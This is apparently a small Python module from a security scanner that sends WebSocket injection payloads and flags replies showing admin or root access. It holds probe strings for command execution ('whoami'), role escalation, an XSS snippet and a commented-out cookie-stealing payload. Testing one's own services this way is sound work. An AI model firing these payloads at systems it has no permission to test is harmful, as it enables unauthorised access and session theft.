import websocket

# WebSocket test payloads
PAYLOADS = [
    '{"action":"echo","data":"test"}',
    '{"action":"getAdminData"}',
    '{"cmd":"whoami"}',
    '{"type":"auth","role":"admin"}'
]

def check(ws_url):
    findings = []

    try:
        ws = websocket.create_connection(ws_url)
        for payload in PAYLOADS:
            ws.send(payload)
            result = ws.recv()
            if any(word in result.lower() for word in ["admin", "root", "uid=", "flag", "token"]):
                findings.append(f"Possible WebSocket Injection: {payload}")
        ws.close()
    except Exception as e:
        findings.append("WebSocket test failed or not supported")
    
    return findings

# === Exotic Payloads Enhancement ===

# WebSocket injection enhancements
#    '{"action":"subscribe","channel":"*"}',
#    '{"cmd":"ping"}',
#    '{"input":"<svg onload=alert(1)>"}'

# === Advanced WebSocket Payloads ===
#    '{"action":"steal","session":document.cookie}',
#    '{"cmd":"admin"}',
